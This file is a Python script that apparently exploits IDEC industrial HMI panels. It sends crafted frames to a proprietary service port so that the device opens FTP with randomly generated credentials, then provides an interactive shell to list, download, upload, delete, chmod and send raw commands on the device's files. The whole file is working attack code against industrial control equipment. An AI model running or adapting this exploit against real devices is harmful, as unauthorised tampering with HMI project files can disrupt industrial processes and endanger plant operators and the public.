#!/usr/bin/env python3
import socket
import random
import time
import os
from ftplib import FTP, all_errors
import argparse

DEFAULT_HMI_IP = "192.168.1.150"
HMI_IP = DEFAULT_HMI_IP
DISM_PORT = 2537
FTP_PORT = 2539


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def rand_hex(n):
    return "".join(random.choice("0123456789abcdef") for _ in range(n))


def bcc(body: bytes) -> int:
    x = 0x05
    for b in body:
        x ^= b
    return x


def frame(seq: int, body: bytes) -> bytes:
    body2 = body + f"{bcc(body):02X}".encode("ascii") + b"\r"
    total_len = 19 + len(body2)

    header = bytes([
        0x01,
        (total_len >> 16) & 0xff,
        (total_len >> 8) & 0xff,
        total_len & 0xff,
        0x00, 0x01,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        seq & 0xff,
        0x01, 0x01, 0x01,
        0x05,
    ])

    return header + body2


def make_lb_body(username: str, password: str) -> bytes:
    user_field = username.encode("ascii").hex().encode("ascii").upper().ljust(64, b"0")

    doubled_pass = bytes((ord(ch) * 2) & 0xff for ch in password)
    pass_field = doubled_pass.hex().encode("ascii").upper().ljust(128, b"0")

    return b"00FFLB" + bytes([0xC0, 0x00, 0x01]) + user_field + pass_field


def send_cmd(sock, seq, body, name):
    pkt = frame(seq, body)
    print(f"{name} TX:", pkt.hex(" "))
    sock.sendall(pkt)
    rx = sock.recv(4096)
    print(f"{name} RX:", rx.hex(" "))
    return rx


def open_hmi_ftp_session(username, password):
    with socket.create_connection((HMI_IP, DISM_PORT), timeout=5) as s:
        send_cmd(s, 5, b"00FFAB", "AB")
        send_cmd(s, 6, make_lb_body(username, password), "LB")
        send_cmd(s, 7, b"00FFLF", "LF")


def wait_for_ftp(username, password):
    last = None

    for attempt in range(1, 21):
        try:
            ftp = FTP()
            ftp.connect(HMI_IP, FTP_PORT, timeout=5)
            print(ftp.getwelcome())
            ftp.login(username, password)
            ftp.voidcmd("TYPE I")
            return ftp
        except all_errors as e:
            print(f"FTP attempt {attempt}/20 failed:", repr(e))
            last = e
            time.sleep(0.25)

    raise last


def ftp_shell(ftp):
    while True:
        try:
            line = input(f"ftp:{ftp.pwd()}> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not line:
            continue

        if line.lower() in ("clear", "cls"):
            clear_screen()
            continue

        parts = line.split()
        cmd = parts[0].lower()
        args = parts[1:]

        try:
            if cmd in ("quit", "exit", "bye"):
                break

            elif cmd == "pwd":
                print(ftp.pwd())

            elif cmd in ("ls", "dir"):
                path = args[0] if args else ""
                ftp.retrlines(f"LIST {path}".strip())

            elif cmd == "nlst":
                path = args[0] if args else ""
                for name in ftp.nlst(path):
                    print(name)

            elif cmd == "cd":
                ftp.cwd(args[0])

            elif cmd == "get":
                remote = args[0]
                local = args[1] if len(args) > 1 else remote
                with open(local, "wb") as f:
                    ftp.retrbinary(f"RETR {remote}", f.write)
                print("saved", local)

            elif cmd == "put":
                local = args[0]
                remote = args[1] if len(args) > 1 else local
                with open(local, "rb") as f:
                    ftp.storbinary(f"STOR {remote}", f)
                print("uploaded", remote)

            elif cmd in ("rm", "delete", "del"):
                ftp.delete(args[0])

            elif cmd == "chmod":
                mode, path = args[0], args[1]
                print(ftp.sendcmd(f"SITE CHMOD {mode} {path}"))

            elif cmd == "raw":
                print(ftp.sendcmd(" ".join(args)))

            else:
                print("unknown command")

        except Exception as e:
            print("ERR:", e)


def main():
    global HMI_IP

    parser = argparse.ArgumentParser(
        description="Interactive FTP shell for IDEC HMIs"
    )

    parser.add_argument(
        "ip",
        nargs="?",
        default=DEFAULT_HMI_IP,
        help=f"HMI IP address (default: {DEFAULT_HMI_IP})"
    )

    args = parser.parse_args()

    HMI_IP = args.ip

    print(f"HMI: {HMI_IP}")    
    username = rand_hex(16)
    password = rand_hex(15)

    print("Temporary FTP creds:")
    print("USER", username)
    print("PASS", password)

    open_hmi_ftp_session(username, password)
    ftp = wait_for_ftp(username, password)

    print("\nConnected. Type FTP commands like:")
    print("  pwd")
    print("  ls")
    print("  cd /tmp")
    print("  get project.znv")
    print("  put localfile.txt")
    print("  delete file.txt")
    print("  chmod 755 project.znv")
    print("  clear")
    print("  quit")
    print()

    try:
        ftp_shell(ftp)
    finally:
        try:
            ftp.quit()
        except Exception:
            try:
                ftp.close()
            except Exception:
                pass


if __name__ == "__main__":
    main()
